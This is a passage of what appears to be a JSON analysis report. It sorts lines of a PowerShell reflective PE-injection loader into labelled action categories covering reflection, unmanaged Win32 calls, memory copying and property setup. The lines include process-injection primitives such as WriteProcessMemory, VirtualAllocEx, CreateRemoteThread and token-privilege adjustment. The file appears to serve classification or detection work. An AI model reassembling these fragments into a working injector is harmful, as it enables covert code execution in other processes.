                                "($TypeBuilder.DefineField('ImageBase', [UInt32], 'Public')).SetOffset(28) | Out-Null",
                                "($TypeBuilder.DefineField('ImageBase', [UInt64], 'Public')).SetOffset(24) | Out-Null",
                                "($TypeBuilder.DefineField('ImportTable', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(104) | Out-Null",
                                "($TypeBuilder.DefineField('ImportTable', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(120) | Out-Null",
                                "($TypeBuilder.DefineField('LoadConfigTable', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(176) | Out-Null",
                                "($TypeBuilder.DefineField('LoadConfigTable', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(192) | Out-Null",
                                "($TypeBuilder.DefineField('LoaderFlags', [UInt32], 'Public')).SetOffset(104) | Out-Null",
                                "($TypeBuilder.DefineField('LoaderFlags', [UInt32], 'Public')).SetOffset(88) | Out-Null",
                                "($TypeBuilder.DefineField('Magic', $MagicType, 'Public')).SetOffset(0) | Out-Null",
                                "($TypeBuilder.DefineField('MajorImageVersion', [UInt16], 'Public')).SetOffset(44) | Out-Null",
                                "($TypeBuilder.DefineField('MajorLinkerVersion', [Byte], 'Public')).SetOffset(2) | Out-Null",
                                "($TypeBuilder.DefineField('MajorOperatingSystemVersion', [UInt16], 'Public')).SetOffset(40) | Out-Null",
                                "($TypeBuilder.DefineField('MajorSubsystemVersion', [UInt16], 'Public')).SetOffset(48) | Out-Null",
                                "($TypeBuilder.DefineField('MinorImageVersion', [UInt16], 'Public')).SetOffset(46) | Out-Null",
                                "($TypeBuilder.DefineField('MinorLinkerVersion', [Byte], 'Public')).SetOffset(3) | Out-Null",
                                "($TypeBuilder.DefineField('MinorOperatingSystemVersion', [UInt16], 'Public')).SetOffset(42) | Out-Null",
                                "($TypeBuilder.DefineField('MinorSubsystemVersion', [UInt16], 'Public')).SetOffset(50) | Out-Null",
                                "($TypeBuilder.DefineField('NumberOfRvaAndSizes', [UInt32], 'Public')).SetOffset(108) | Out-Null",
                                "($TypeBuilder.DefineField('NumberOfRvaAndSizes', [UInt32], 'Public')).SetOffset(92) | Out-Null",
                                "($TypeBuilder.DefineField('Reserved', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(216) | Out-Null",
                                "($TypeBuilder.DefineField('Reserved', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(232) | Out-Null",
                                "($TypeBuilder.DefineField('ResourceTable', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(112) | Out-Null",
                                "($TypeBuilder.DefineField('ResourceTable', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(128) | Out-Null",
                                "($TypeBuilder.DefineField('SectionAlignment', [UInt32], 'Public')).SetOffset(32) | Out-Null",
                                "($TypeBuilder.DefineField('Size', [UInt32], 'Public')).SetOffset(4) | Out-Null",
                                "($TypeBuilder.DefineField('SizeOfCode', [UInt32], 'Public')).SetOffset(4) | Out-Null",
                                "($TypeBuilder.DefineField('SizeOfHeaders', [UInt32], 'Public')).SetOffset(60) | Out-Null",
                                "($TypeBuilder.DefineField('SizeOfHeapCommit', [UInt32], 'Public')).SetOffset(84) | Out-Null",
                                "($TypeBuilder.DefineField('SizeOfHeapCommit', [UInt64], 'Public')).SetOffset(96) | Out-Null",
                                "($TypeBuilder.DefineField('SizeOfHeapReserve', [UInt32], 'Public')).SetOffset(80) | Out-Null",
                                "($TypeBuilder.DefineField('SizeOfHeapReserve', [UInt64], 'Public')).SetOffset(88) | Out-Null",
                                "($TypeBuilder.DefineField('SizeOfImage', [UInt32], 'Public')).SetOffset(56) | Out-Null",
                                "($TypeBuilder.DefineField('SizeOfInitializedData', [UInt32], 'Public')).SetOffset(8) | Out-Null",
                                "($TypeBuilder.DefineField('SizeOfStackCommit', [UInt32], 'Public')).SetOffset(76) | Out-Null",
                                "($TypeBuilder.DefineField('SizeOfStackCommit', [UInt64], 'Public')).SetOffset(80) | Out-Null",
                                "($TypeBuilder.DefineField('SizeOfStackReserve', [UInt32], 'Public')).SetOffset(72) | Out-Null",
                                "($TypeBuilder.DefineField('SizeOfStackReserve', [UInt64], 'Public')).SetOffset(72) | Out-Null",
                                "($TypeBuilder.DefineField('SizeOfUninitializedData', [UInt32], 'Public')).SetOffset(12) | Out-Null",
                                "($TypeBuilder.DefineField('Subsystem', $SubSystemType, 'Public')).SetOffset(68) | Out-Null",
                                "($TypeBuilder.DefineField('TLSTable', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(168) | Out-Null",
                                "($TypeBuilder.DefineField('TLSTable', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(184) | Out-Null",
                                "($TypeBuilder.DefineField('VirtualAddress', [UInt32], 'Public')).SetOffset(0) | Out-Null",
                                "($TypeBuilder.DefineField('Win32VersionValue', [UInt32], 'Public')).SetOffset(52) | Out-Null",
                                "Write-Output $TypeBuilder.CreateType()"
                            ],
                            "name": "action:DotNet.Type/Define"
                        },
                        {
                            "lines": [
                                "$ConstructorInfo = [System.Runtime.InteropServices.MarshalAsAttribute].GetConstructors()[0]",
                                "$CreateThreadDelegate = Get-DelegateType @([IntPtr], [IntPtr], [IntPtr], [IntPtr], [UInt32], [UInt32].MakeByRefType()) ([IntPtr])",
                                "$FieldArray = @([System.Runtime.InteropServices.MarshalAsAttribute].GetField('SizeConst'))",
                                "$GetExitCodeThreadDelegate = Get-DelegateType @([IntPtr], [Int32].MakeByRefType()) ([Bool])",
                                "$GetModuleHandle = $UnsafeNativeMethods.GetMethod('GetModuleHandle')",
                                "$GetProcAddress = $UnsafeNativeMethods.GetMethod('GetProcAddress', [Type[]]@([System.Runtime.InteropServices.HandleRef], [String]))",
                                "$IsWow64ProcessDelegate = Get-DelegateType @([IntPtr], [Bool].MakeByRefType()) ([Bool])",
                                "$NtCreateThreadExDelegate = Get-DelegateType @([IntPtr].MakeByRefType(), [UInt32], [IntPtr], [IntPtr], [IntPtr], [IntPtr], [Bool], [UInt32], [UInt32], [UInt32], [IntPtr]) ([UInt32])",
                                "$OpenThreadTokenDelegate = Get-DelegateType @([IntPtr], [UInt32], [Bool], [IntPtr].MakeByRefType()) ([Bool])",
                                "$ReadProcessMemoryDelegate = Get-DelegateType @([IntPtr], [IntPtr], [IntPtr], [UIntPtr], [UIntPtr].MakeByRefType()) ([Bool])",
                                "$SystemAssembly = [AppDomain]::CurrentDomain.GetAssemblies() |",
                                "$VirtualProtectDelegate = Get-DelegateType @([IntPtr], [UIntPtr], [UInt32], [UInt32].MakeByRefType()) ([Bool])",
                                "$WriteProcessMemoryDelegate = Get-DelegateType @([IntPtr], [IntPtr], [IntPtr], [UIntPtr], [UIntPtr].MakeByRefType()) ([Bool])"
                            ],
                            "name": "action:DotNet.Type/Reflect"
                        },
                        {
                            "lines": [
                                "$AdjustTokenPrivileges = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($AdjustTokenPrivilegesAddr, $AdjustTokenPrivilegesDelegate)",
                                "$BaseRelocationTable = [System.Runtime.InteropServices.Marshal]::PtrToStructure($BaseRelocPtr, [Type]$Win32Types.IMAGE_BASE_RELOCATION)",
                                "$CreateRemoteThread = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($CreateRemoteThreadAddr, $CreateRemoteThreadDelegate)",
                                "$CreateThread = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($CreateThreadAddr, $CreateThreadDelegate)",
                                "$DllMain = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($DllMainPtr, $DllMainDelegate)",
                                "$ExitProcessOrigBytesPtr = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($TotalSize)",
                                "$ExportTable = [System.Runtime.InteropServices.Marshal]::PtrToStructure($ExportTablePtr, [Type]$Win32Types.IMAGE_EXPORT_DIRECTORY)",
                                "$FreeLibrary = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($FreeLibraryAddr, $FreeLibraryDelegate)",
                                "$FuncIndex = [System.Runtime.InteropServices.Marshal]::PtrToStructure($OrdinalPtr, [Type][UInt16])",
                                "$FuncOffset = [System.Runtime.InteropServices.Marshal]::PtrToStructure($FuncOffsetAddr, [Type][UInt32])",
                                "$GetCommandLineAOrigBytesPtr = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($TotalSize)",
                                "$GetCommandLineWOrigBytesPtr = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($TotalSize)",
                                "$GetCurrentThread = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($GetCurrentThreadAddr, $GetCurrentThreadDelegate)",
                                "$GetExitCodeThread = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($GetExitCodeThreadAddr, $GetExitCodeThreadDelegate)",
                                "$GetModuleHandle = $UnsafeNativeMethods.GetMethod('GetModuleHandle')",
                                "$GetModuleHandle = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($GetModuleHandleAddr, $GetModuleHandleDelegate)",
                                "$GetProcAddress = $UnsafeNativeMethods.GetMethod('GetProcAddress', [Type[]]@([System.Runtime.InteropServices.HandleRef], [String]))",
                                "$GetProcAddress = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($GetProcAddressAddr, $GetProcAddressDelegate)",
                                "$GetProcAddressOrdinal = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($GetProcAddressOrdinalAddr, $GetProcAddressOrdinalDelegate)",
                                "$ImageNtHeaders32 = [System.Runtime.InteropServices.Marshal]::PtrToStructure($NtHeadersPtr, [Type]$Win32Types.IMAGE_NT_HEADERS32)",
                                "$ImpersonateSelf = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($ImpersonateSelfAddr, $ImpersonateSelfDelegate)",
                                "$ImportDescriptor = [System.Runtime.InteropServices.Marshal]::PtrToStructure($ImportDescriptorPtr, [Type]$Win32Types.IMAGE_IMPORT_DESCRIPTOR)",
                                "$IsWow64Process = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($IsWow64ProcessAddr, $IsWow64ProcessDelegate)",
                                "$LoadLibrary = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($LoadLibraryAddr, $LoadLibraryDelegate)",
                                "$LocalFree = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($LocalFreeAddr, $LocalFreeDelegate)",
                                "$LookupPrivilegeValue = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($LookupPrivilegeValueAddr, $LookupPrivilegeValueDelegate)",
                                "$NamePtr = Add-SignedIntAsUnsigned ($PEHandle) ([System.Runtime.InteropServices.Marshal]::PtrToStructure($NameOffsetPtr, [Type][UInt32]))",
                                "$NtCreateThreadEx = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($NtCreateThreadExAddr, $NtCreateThreadExDelegate)",
                                "$OpenProcess = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($OpenProcessAddr, $OpenProcessDelegate)",
                                "$OpenThreadToken = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($OpenThreadTokenAddr, $OpenThreadTokenDelegate)",
                                "$OrigACmdLnPtr = [System.Runtime.InteropServices.Marshal]::PtrToStructure($ACmdLnAddr, [Type][IntPtr])",
                                "$OrigACmdLnPtrStorage = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($PtrSize)",
                                "$OrigWCmdLnPtr = [System.Runtime.InteropServices.Marshal]::PtrToStructure($WCmdLnAddr, [Type][IntPtr])",
                                "$OrigWCmdLnPtrStorage = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($PtrSize)",
                                "$ReadProcessMemory = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($ReadProcessMemoryAddr, $ReadProcessMemoryDelegate)",
                                "$SCPSMem = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($SCLength)",
                                "$SectionHeader = [System.Runtime.InteropServices.Marshal]::PtrToStructure($SectionHeaderPtr, [Type]$Win32Types.IMAGE_SECTION_HEADER)",
                                "$TokenPrivileges = [System.Runtime.InteropServices.Marshal]::PtrToStructure($TokenPrivilegesMem, [Type]$Win32Types.TOKEN_PRIVILEGES)",
                                "$TokenPrivileges.Privileges.Luid = [System.Runtime.InteropServices.Marshal]::PtrToStructure($PLuid, [Type]$Win32Types.LUID)",
                                "$UnsafeNativeMethods = $SystemAssembly.GetType('Microsoft.Win32.UnsafeNativeMethods')",
                                "$VirtualAlloc = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($VirtualAllocAddr, $VirtualAllocDelegate)",
                                "$VirtualAllocEx = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($VirtualAllocExAddr, $VirtualAllocExDelegate)",
                                "$VirtualFree = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($VirtualFreeAddr, $VirtualFreeDelegate)",
                                "$VirtualFreeEx = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($VirtualFreeExAddr, $VirtualFreeExDelegate)",
                                "$VirtualProtect = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($VirtualProtectAddr, $VirtualProtectDelegate)",
                                "$WStringFunc = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($WStringFuncAddr, $WStringFuncDelegate)",
                                "$WaitForSingleObject = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($WaitForSingleObjectAddr, $WaitForSingleObjectDelegate)",
                                "$WriteProcessMemory = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($WriteProcessMemoryAddr, $WriteProcessMemoryDelegate)",
                                "$dosHeader = [System.Runtime.InteropServices.Marshal]::PtrToStructure($PEHandle, [Type]$Win32Types.IMAGE_DOS_HEADER)",
                                "$imageNtHeaders64 = [System.Runtime.InteropServices.Marshal]::PtrToStructure($NtHeadersPtr, [Type]$Win32Types.IMAGE_NT_HEADERS64)",
                                "$memcpy = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($memcpyAddr, $memcpyDelegate)",
                                "$memset = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($memsetAddr, $memsetDelegate)",
                                "[Byte]$ThreadDone = [System.Runtime.InteropServices.Marshal]::ReadByte($ExeDoneBytePtr, 0)",
                                "[IntPtr]$CurrAddr = [System.Runtime.InteropServices.Marshal]::PtrToStructure($FinalAddr, [Type][IntPtr])",
                                "[IntPtr]$DllAddress = [System.Runtime.InteropServices.Marshal]::PtrToStructure($ReturnValMem, [Type][IntPtr])",
                                "[IntPtr]$ExeDoneBytePtr = [System.Runtime.InteropServices.Marshal]::AllocHGlobal(1)",
                                "[IntPtr]$OriginalThunkRefVal = [System.Runtime.InteropServices.Marshal]::PtrToStructure($OriginalThunkRef, [Type][IntPtr])",
                                "[IntPtr]$PLuid = [System.Runtime.InteropServices.Marshal]::AllocHGlobal([System.Runtime.InteropServices.Marshal]::SizeOf([Type]$Win32Types.LUID))",
                                "[IntPtr]$ProcAddress = [System.Runtime.InteropServices.Marshal]::PtrToStructure($ReturnValMem, [Type][IntPtr])",
                                "[IntPtr]$ReturnValMem = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($PtrSize)",
                                "[IntPtr]$TokenPrivilegesMem = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($TokenPrivSize)",
                                "[IntPtr]$UnmanagedPEBytes = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($PEBytes.Length)",
                                "[System.Runtime.InteropServices.Marshal]::FreeHGlobal($FunctionNamePtr)",
                                "[System.Runtime.InteropServices.Marshal]::FreeHGlobal($TokenPrivilegesMem)",
                                "[System.Runtime.InteropServices.Marshal]::FreeHGlobal($UnmanagedPEBytes)",
                                "[System.Runtime.InteropServices.Marshal]::FreeHGlobal($WStringInput)",
                                "[System.Runtime.InteropServices.Marshal]::StructureToPtr($CmdLineAArgsPtr, $GetCommandLineAAddrTemp, $false)",
                                "[System.Runtime.InteropServices.Marshal]::StructureToPtr($CmdLineWArgsPtr, $GetCommandLineWAddrTemp, $false)",
                                "[System.Runtime.InteropServices.Marshal]::StructureToPtr($CurrAddr, $FinalAddr, $false) | Out-Null",
                                "[System.Runtime.InteropServices.Marshal]::StructureToPtr($DllMainPtr, $SCPSMem, $false)",
                                "[System.Runtime.InteropServices.Marshal]::StructureToPtr($EffectivePEHandle, $SCPSMem, $false)",
                                "[System.Runtime.InteropServices.Marshal]::StructureToPtr($ExeDoneBytePtr, $ProcExitFunctionAddrTmp, $false)",
                                "[System.Runtime.InteropServices.Marshal]::StructureToPtr($ExitThreadAddr, $ProcExitFunctionAddrTmp, $false)",
                                "[System.Runtime.InteropServices.Marshal]::StructureToPtr($GetProcAddressAddr, $SCPSMem, $false)",
                                "[System.Runtime.InteropServices.Marshal]::StructureToPtr($GetProcAddressRetMem, $SCPSMem, $false)",
                                "[System.Runtime.InteropServices.Marshal]::StructureToPtr($LoadLibraryAAddr, $SCPSMem, $false)",
                                "[System.Runtime.InteropServices.Marshal]::StructureToPtr($LoadLibraryARetMem, $SCPSMem, $false)",
                                "[System.Runtime.InteropServices.Marshal]::StructureToPtr($NewACmdLnPtr, $ACmdLnAddr, $false)",
                                "[System.Runtime.InteropServices.Marshal]::StructureToPtr($NewThunkRef, $ThunkRef, $false)",
                                "[System.Runtime.InteropServices.Marshal]::StructureToPtr($NewWCmdLnPtr, $WCmdLnAddr, $false)",
                                "[System.Runtime.InteropServices.Marshal]::StructureToPtr($OrigACmdLnPtr, $OrigACmdLnPtrStorage, $false)",
                                "[System.Runtime.InteropServices.Marshal]::StructureToPtr($OrigWCmdLnPtr, $OrigWCmdLnPtrStorage, $false)",
                                "[System.Runtime.InteropServices.Marshal]::StructureToPtr($RFuncNamePtr, $SCPSMem, $false)",
                                "[System.Runtime.InteropServices.Marshal]::StructureToPtr($RImportDllPathPtr, $SCPSMem, $false)",
                                "[System.Runtime.InteropServices.Marshal]::StructureToPtr($RemoteDllHandle, $SCPSMem, $false)",
                                "[System.Runtime.InteropServices.Marshal]::StructureToPtr($TokenPrivileges, $TokenPrivilegesMem, $true)",
                                "[System.Runtime.InteropServices.Marshal]::WriteByte($ExeDoneBytePtr, 0, 0x00)",
                                "[System.Runtime.InteropServices.Marshal]::WriteByte($MemoryAddress, $Offset, $Bytes[$Offset])",
                                "[UInt16]$RelocationInfo = [System.Runtime.InteropServices.Marshal]::PtrToStructure($RelocationInfoPtr, [Type][UInt16])"
                            ],
                            "name": "action:DotNet.UnmanagedCode/Invoke"
                        },
                        {
                            "lines": [
                                "Copy-ArrayOfMemAddresses -CopyInfo $OverwrittenMemInfo -Win32Functions $Win32Functions -Win32Constants $Win32Constants",
                                "Copy-Sections -PEBytes $PEBytes -PEInfo $PEInfo -Win32Functions $Win32Functions -Win32Types $Win32Types",
                                "Test-MemoryRangeValid -DebugString \"Copy-Sections::MarshalCopy\" -PEInfo $PEInfo -StartAddress $SectionDestAddr -Size $SizeOfRawData | Out-Null",
                                "Test-MemoryRangeValid -DebugString \"Copy-Sections::Memset\" -PEInfo $PEInfo -StartAddress $StartAddress -Size $Difference | Out-Null",
                                "Write-Verbose \"Copy PE sections in to memory\"",
                                "[System.Runtime.InteropServices.Marshal]::Copy($PEBytes, 0, $PEHandle, $PEInfo.SizeOfHeaders) | Out-Null",
                                "[System.Runtime.InteropServices.Marshal]::Copy($PEBytes, 0, $UnmanagedPEBytes, $PEBytes.Length) | Out-Null",
                                "[System.Runtime.InteropServices.Marshal]::Copy($PEBytes, [Int32]$SectionHeader.PointerToRawData, $SectionDestAddr, $SizeOfRawData)"
                            ],
                            "name": "action:Item/Copy"
                        },
                        {
                            "lines": [
                                "$NtHeadersInfo | Add-Member -MemberType NoteProperty -Name IMAGE_NT_HEADERS -Value $imageNtHeaders32",
                                "$NtHeadersInfo | Add-Member -MemberType NoteProperty -Name IMAGE_NT_HEADERS -Value $imageNtHeaders64",
                                "$NtHeadersInfo | Add-Member -MemberType NoteProperty -Name NtHeadersPtr -Value $NtHeadersPtr",
                                "$NtHeadersInfo | Add-Member -MemberType NoteProperty -Name PE64Bit -Value $false",
                                "$NtHeadersInfo | Add-Member -MemberType NoteProperty -Name PE64Bit -Value $true",
                                "$PEInfo | Add-Member -MemberType NoteProperty -Name 'DllCharacteristics' -Value ($NtHeadersInfo.IMAGE_NT_HEADERS.OptionalHeader.DllCharacteristics)",
                                "$PEInfo | Add-Member -MemberType NoteProperty -Name 'OriginalImageBase' -Value ($NtHeadersInfo.IMAGE_NT_HEADERS.OptionalHeader.ImageBase)",
                                "$PEInfo | Add-Member -MemberType NoteProperty -Name 'PE64Bit' -Value ($NtHeadersInfo.PE64Bit)",
                                "$PEInfo | Add-Member -MemberType NoteProperty -Name 'SizeOfHeaders' -Value ($NtHeadersInfo.IMAGE_NT_HEADERS.OptionalHeader.SizeOfHeaders)",
                                "$PEInfo | Add-Member -MemberType NoteProperty -Name 'SizeOfImage' -Value ($NtHeadersInfo.IMAGE_NT_HEADERS.OptionalHeader.SizeOfImage)",
                                "$PEInfo | Add-Member -MemberType NoteProperty -Name EffectivePEHandle -Value $EffectivePEHandle",
                                "$PEInfo | Add-Member -MemberType NoteProperty -Name EndAddress -Value $PEEndAddress",
                                "$PEInfo | Add-Member -MemberType NoteProperty -Name FileType -Value 'DLL'",
                                "$PEInfo | Add-Member -MemberType NoteProperty -Name FileType -Value 'EXE'",
                                "$PEInfo | Add-Member -MemberType NoteProperty -Name IMAGE_NT_HEADERS -Value ($NtHeadersInfo.IMAGE_NT_HEADERS)",
                                "$PEInfo | Add-Member -MemberType NoteProperty -Name NtHeadersPtr -Value ($NtHeadersInfo.NtHeadersPtr)",
                                "$PEInfo | Add-Member -MemberType NoteProperty -Name PE64Bit -Value ($NtHeadersInfo.PE64Bit)",
                                "$PEInfo | Add-Member -MemberType NoteProperty -Name PEHandle -Value $PEHandle",
                                "$PEInfo | Add-Member -MemberType NoteProperty -Name SectionHeaderPtr -Value $SectionHeaderPtr",
                                "$Win32Constants | Add-Member -MemberType NoteProperty -Name ERROR_NO_TOKEN -Value 0x3f0",
                                "$Win32Constants | Add-Member -MemberType NoteProperty -Name IMAGE_DLLCHARACTERISTICS_DYNAMIC_BASE -Value 0x40",
                                "$Win32Constants | Add-Member -MemberType NoteProperty -Name IMAGE_DLLCHARACTERISTICS_NX_COMPAT -Value 0x100",
                                "$Win32Constants | Add-Member -MemberType NoteProperty -Name IMAGE_FILE_DLL -Value 0x2000",
                                "$Win32Constants | Add-Member -MemberType NoteProperty -Name IMAGE_FILE_EXECUTABLE_IMAGE -Value 0x0002",
                                "$Win32Constants | Add-Member -MemberType NoteProperty -Name IMAGE_REL_BASED_ABSOLUTE -Value 0",
                                "$Win32Constants | Add-Member -MemberType NoteProperty -Name IMAGE_REL_BASED_DIR64 -Value 10",
                                "$Win32Constants | Add-Member -MemberType NoteProperty -Name IMAGE_REL_BASED_HIGHLOW -Value 3",
                                "$Win32Constants | Add-Member -MemberType NoteProperty -Name IMAGE_SCN_MEM_DISCARDABLE -Value 0x02000000",
                                "$Win32Constants | Add-Member -MemberType NoteProperty -Name IMAGE_SCN_MEM_EXECUTE -Value 0x20000000",
                                "$Win32Constants | Add-Member -MemberType NoteProperty -Name IMAGE_SCN_MEM_NOT_CACHED -Value 0x04000000",
                                "$Win32Constants | Add-Member -MemberType NoteProperty -Name IMAGE_SCN_MEM_READ -Value 0x40000000",
                                "$Win32Constants | Add-Member -MemberType NoteProperty -Name IMAGE_SCN_MEM_WRITE -Value 0x80000000",
                                "$Win32Constants | Add-Member -MemberType NoteProperty -Name MEM_COMMIT -Value 0x00001000",
                                "$Win32Constants | Add-Member -MemberType NoteProperty -Name MEM_DECOMMIT -Value 0x4000",
                                "$Win32Constants | Add-Member -MemberType NoteProperty -Name MEM_RELEASE -Value 0x8000",
                                "$Win32Constants | Add-Member -MemberType NoteProperty -Name MEM_RESERVE -Value 0x00002000",
                                "$Win32Constants | Add-Member -MemberType NoteProperty -Name PAGE_EXECUTE -Value 0x10",
                                "$Win32Constants | Add-Member -MemberType NoteProperty -Name PAGE_EXECUTE_READ -Value 0x20",
                                "$Win32Constants | Add-Member -MemberType NoteProperty -Name PAGE_EXECUTE_READWRITE -Value 0x40",
                                "$Win32Constants | Add-Member -MemberType NoteProperty -Name PAGE_EXECUTE_WRITECOPY -Value 0x80",
                                "$Win32Constants | Add-Member -MemberType NoteProperty -Name PAGE_NOACCESS -Value 0x01",
                                "$Win32Constants | Add-Member -MemberType NoteProperty -Name PAGE_NOCACHE -Value 0x200",
                                "$Win32Constants | Add-Member -MemberType NoteProperty -Name PAGE_READONLY -Value 0x02",
                                "$Win32Constants | Add-Member -MemberType NoteProperty -Name PAGE_READWRITE -Value 0x04",
                                "$Win32Constants | Add-Member -MemberType NoteProperty -Name PAGE_WRITECOPY -Value 0x08",
                                "$Win32Constants | Add-Member -MemberType NoteProperty -Name SE_PRIVILEGE_ENABLED -Value 0x2",
                                "$Win32Constants | Add-Member -MemberType NoteProperty -Name TOKEN_ADJUST_PRIVILEGES -Value 0x0020",
                                "$Win32Constants | Add-Member -MemberType NoteProperty -Name TOKEN_QUERY -Value 0x0008",
                                "$Win32Functions | Add-Member -MemberType NoteProperty -Name AdjustTokenPrivileges -Value $AdjustTokenPrivileges",
                                "$Win32Functions | Add-Member -MemberType NoteProperty -Name CreateRemoteThread -Value $CreateRemoteThread",
                                "$Win32Functions | Add-Member -MemberType NoteProperty -Name CreateThread -Value $CreateThread",
                                "$Win32Functions | Add-Member -MemberType NoteProperty -Name FreeLibrary -Value $FreeLibrary",
                                "$Win32Functions | Add-Member -MemberType NoteProperty -Name GetCurrentThread -Value $GetCurrentThread",
                                "$Win32Functions | Add-Member -MemberType NoteProperty -Name GetExitCodeThread -Value $GetExitCodeThread",
                                "$Win32Functions | Add-Member -MemberType NoteProperty -Name GetProcAddress -Value $GetProcAddress",
                                "$Win32Functions | Add-Member -MemberType NoteProperty -Name GetProcAddressOrdinal -Value $GetProcAddressOrdinal",
                                "$Win32Functions | Add-Member -MemberType NoteProperty -Name ImpersonateSelf -Value $ImpersonateSelf",
                                "$Win32Functions | Add-Member -MemberType NoteProperty -Name IsWow64Process -Value $IsWow64Process",
                                "$Win32Functions | Add-Member -MemberType NoteProperty -Name LoadLibrary -Value $LoadLibrary",
                                "$Win32Functions | Add-Member -MemberType NoteProperty -Name LookupPrivilegeValue -Value $LookupPrivilegeValue",
                                "$Win32Functions | Add-Member -MemberType NoteProperty -Name NtCreateThreadEx -Value $NtCreateThreadEx",
                                "$Win32Functions | Add-Member -MemberType NoteProperty -Name OpenProcess -Value $OpenProcess",
                                "$Win32Functions | Add-Member -MemberType NoteProperty -Name OpenThreadToken -Value $OpenThreadToken",
                                "$Win32Functions | Add-Member -MemberType NoteProperty -Name ReadProcessMemory -Value $ReadProcessMemory",
                                "$Win32Functions | Add-Member -MemberType NoteProperty -Name WaitForSingleObject -Value $WaitForSingleObject",
                                "$Win32Functions | Add-Member -MemberType NoteProperty -Name WriteProcessMemory -Value $WriteProcessMemory",
                                "$Win32Functions | Add-Member -MemberType NoteProperty -Name memcpy -Value $memcpy",
                                "$Win32Functions | Add-Member -MemberType NoteProperty -Name memset -Value $memset",
                                "$Win32Functions | Add-Member NoteProperty -Name GetModuleHandle -Value $GetModuleHandle",
                                "$Win32Functions | Add-Member NoteProperty -Name LocalFree -Value $LocalFree",
                                "$Win32Functions | Add-Member NoteProperty -Name VirtualAlloc -Value $VirtualAlloc",
                                "$Win32Functions | Add-Member NoteProperty -Name VirtualAllocEx -Value $VirtualAllocEx",
                                "$Win32Functions | Add-Member NoteProperty -Name VirtualFree -Value $VirtualFree",
                                "$Win32Functions | Add-Member NoteProperty -Name VirtualFreeEx -Value $VirtualFreeEx",
                                "$Win32Functions | Add-Member NoteProperty -Name VirtualProtect -Value $VirtualProtect",
                                "$Win32Types | Add-Member -MemberType NoteProperty -Name DllCharacteristicsType -Value $DllCharacteristicsType",
                                "$Win32Types | Add-Member -MemberType NoteProperty -Name IMAGE_BASE_RELOCATION -Value $IMAGE_BASE_RELOCATION",
                                "$Win32Types | Add-Member -MemberType NoteProperty -Name IMAGE_DATA_DIRECTORY -Value $IMAGE_DATA_DIRECTORY",
                                "$Win32Types | Add-Member -MemberType NoteProperty -Name IMAGE_DOS_HEADER -Value $IMAGE_DOS_HEADER",
                                "$Win32Types | Add-Member -MemberType NoteProperty -Name IMAGE_EXPORT_DIRECTORY -Value $IMAGE_EXPORT_DIRECTORY",
                                "$Win32Types | Add-Member -MemberType NoteProperty -Name IMAGE_FILE_HEADER -Value $IMAGE_FILE_HEADER",
                                "$Win32Types | Add-Member -MemberType NoteProperty -Name IMAGE_IMPORT_DESCRIPTOR -Value $IMAGE_IMPORT_DESCRIPTOR",
                                "$Win32Types | Add-Member -MemberType NoteProperty -Name IMAGE_NT_HEADERS32 -Value $IMAGE_NT_HEADERS32",
                                "$Win32Types | Add-Member -MemberType NoteProperty -Name IMAGE_NT_HEADERS64 -Value $IMAGE_NT_HEADERS64",
                                "$Win32Types | Add-Member -MemberType NoteProperty -Name IMAGE_OPTIONAL_HEADER32 -Value $IMAGE_OPTIONAL_HEADER32",
                                "$Win32Types | Add-Member -MemberType NoteProperty -Name IMAGE_OPTIONAL_HEADER64 -Value $IMAGE_OPTIONAL_HEADER64",
                                "$Win32Types | Add-Member -MemberType NoteProperty -Name IMAGE_SECTION_HEADER -Value $IMAGE_SECTION_HEADER",
                                "$Win32Types | Add-Member -MemberType NoteProperty -Name LUID -Value $LUID",
